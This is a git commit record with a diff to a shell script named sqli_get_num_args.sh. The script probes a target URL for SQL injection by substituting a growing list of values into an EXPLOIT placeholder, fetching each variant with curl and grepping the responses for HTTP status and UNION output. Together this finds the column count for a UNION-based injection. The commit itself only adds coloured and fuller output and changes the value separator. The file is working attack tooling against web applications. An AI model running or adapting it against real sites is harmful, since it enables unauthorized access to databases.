43e178803ede3fd16a1a65be2717f417fcb1bd0c
Manfred Touron <m@42.am>
2012-08-08 00:25:55 +0200

    added colour support to sqli get num args

--- sqli_get_num_args.sh
+++ sqli_get_num_args.sh
@@ -9,8 +9,11 @@ replace="$prefix"1
 while True; do
     URL=$(echo $1 | sed 's/EXPLOIT/'$replace'/')
     echo $URL
-    curl -s -i $URL | grep --color -E "$prefix|HTTP"
+    content=$(curl -s -i $URL)
+    echo $content | grep --color -E "$prefix|HTTP"
+    echo $content | grep UNION
+    echo $content
     i=$(echo $i + 1 | bc)
-    replace="$replace+$prefix$i"
+    replace="$replace,$prefix$i"
     sleep .1
 done
